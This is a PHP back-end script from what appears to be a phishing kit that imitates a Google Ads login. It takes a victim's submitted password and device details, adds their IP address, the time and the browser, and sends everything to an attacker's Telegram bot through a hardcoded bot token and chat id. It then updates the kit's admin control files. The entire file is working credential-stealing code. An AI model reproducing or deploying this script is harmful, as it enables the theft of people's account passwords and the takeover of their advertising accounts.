<?php

include('get_browser.php');
include('get_ip.php');
include('Email.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	
	
if ($_POST['PASS'] == "" || $_POST['DEVICE'] == "") {
  
  

$data['statut'] = 'error'; 
$data['title'] = 'error';
$data['resultat']="no data entered";
  
  }else{

$DCH_MESSAGE .= "
+=======GOOGLE ADS INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+==========PASSWORD GOOGLE ADS========+
| DEVICE USER AGENT      =  ".$_POST['DEVICE']."
| PASSWORD      =  ".$_POST['PASS']."
+===============================+\n";


file_get_contents("https://api.telegram.org/bot6196246979:AAH2NnpU4bkZ5S46GK7wPLQorWeEIWZ9cA8/sendMessage?chat_id=6266573976&text=".urlencode($DCH_MESSAGE)."" );

$Page .= ' ';

$fPage = fopen("../admin/Show_system/Show_Page.txt", "w");
$numPage = fopen("../admin/Show_system/Show_Appverify.txt", "w");
$appPage = fopen("../admin/Show_system/Show_AppBenef.txt", "w");
$mailPage = fopen("../admin/Show_system/Show_Emailverify.txt", "w");

fwrite($fPage, $Page);
fwrite($numPage, $Page);
fwrite($appPage, $Page);
fwrite($mailPage, $Page);


$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


